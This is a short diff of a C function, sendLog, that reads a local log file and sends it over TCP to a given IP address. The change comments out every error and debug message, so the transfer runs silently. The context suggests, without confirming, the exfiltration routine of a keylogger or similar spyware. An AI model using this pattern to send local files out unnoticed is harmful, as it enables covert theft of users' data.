@@ -59,12 +59,12 @@ int sendLog(char* ip) {
 
 
     if ((he=gethostbyname(ip)) == NULL) {  /* get the host info */
-        herror("gethostbyname");
+        //herror("gethostbyname");
         return 1;
     }
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
-        perror("socket");
+        //perror("socket");
         return 1;
     }
 
@@ -75,17 +75,17 @@ int sendLog(char* ip) {
 
     if (connect(sockfd, (struct sockaddr *)&their_addr, \
                                           sizeof(struct sockaddr)) == -1) {
-        perror("connect");
+        //perror("connect");
         return 1;
     }
     FILE *log = fopen(LOGFILE, "r");
     if (log == NULL) {
-        printf("File not found");
+        //printf("File not found");
         return 1;
     }
     char sendbuf[100] = {0};
     while (fgets(sendbuf,100,log) != NULL) {
-        printf("Sending: %s\n", sendbuf);
+        //printf("Sending: %s\n", sendbuf);
         while (send(sockfd, sendbuf, 100, 0) == -1){
               //perror("send");
               continue;
